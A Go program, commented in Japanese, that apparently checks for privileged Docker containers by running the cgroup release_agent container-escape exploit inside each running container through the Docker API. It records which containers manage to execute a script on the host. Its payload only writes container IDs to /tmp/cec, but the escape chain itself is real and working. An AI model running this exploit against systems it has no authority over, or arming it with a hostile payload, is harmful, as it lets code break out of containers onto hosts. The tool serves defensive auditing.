package main

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"time"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
)

func main() {
	// 危険なコンテナのIDを格納するファイル
	filePath := "/tmp/cec"

	// ファイルが存在する場合は削除
	if _, err := os.Stat(filePath); err == nil {
		os.Remove(filePath)
	}

	// 空のファイルを作成
	file, err := os.Create(filePath)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	// Dockerクライアントを作成
	cli, err := client.NewClientWithOpts(client.FromEnv)
	if err != nil {
		panic(err)
	}

	// コンテナのリストを取得
	containers, err := cli.ContainerList(context.Background(), container.ListOptions{})
	if err != nil {
		panic(err)
	}

	// コンテナのIDを保管するスライスを作成
	containerIDs := make([]string, len(containers))

	// コンテナごとにコマンドを実行
	for i, container := range containers {
		containerIDs[i] = container.ID
		fmt.Printf("Container ID: %s\n", container.ID)
		// コンテナエスケープに使うコマンド
		commands := [][]string{
			{"sh", "-c", `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`},
			{"sh", "-c", `echo 1 > /tmp/cgrp/x/notify_on_release`},
			{"sh", "-c", `echo '#!/bin/sh\necho "` + container.ID + `" >> /tmp/cec' > /cmd && chmod +x /cmd`},
			{"sh", "-c", `echo "$(mount | grep overlay2 | grep -oP 'upperdir=\K[^,]*')/cmd" > /tmp/cgrp/release_agent`},
			{"sh", "-c", `sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`},
		}
		for _, cmd := range commands {
			execConfig := types.ExecConfig{
				Cmd: cmd,
			}
			execResp, err := cli.ContainerExecCreate(context.Background(), container.ID, execConfig)
			if err != nil {
				fmt.Fprintf(os.Stderr, "Error creating exec: %v\n", err)
				continue
			}

			err = cli.ContainerExecStart(context.Background(), execResp.ID, types.ExecStartCheck{})
			if err != nil {
				fmt.Fprintf(os.Stderr, "Error starting exec: %v\n", err)
				continue
			}
		}
	}

	// 1秒待機
	time.Sleep(1 * time.Second)

	file, err = os.Open(filePath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	lines := []string{}
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	fmt.Println("Dangerous containers are")
	escapeFlag := false

	for _, containerID := range containerIDs {
		for _, line := range lines {
			if line == containerID {
				escapeFlag = true
				fmt.Printf("Privileged Escape : %s\n", containerID)
				break
			}
		}
	}

	if escapeFlag == false {
		fmt.Println("not available !!!")
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
	}

}
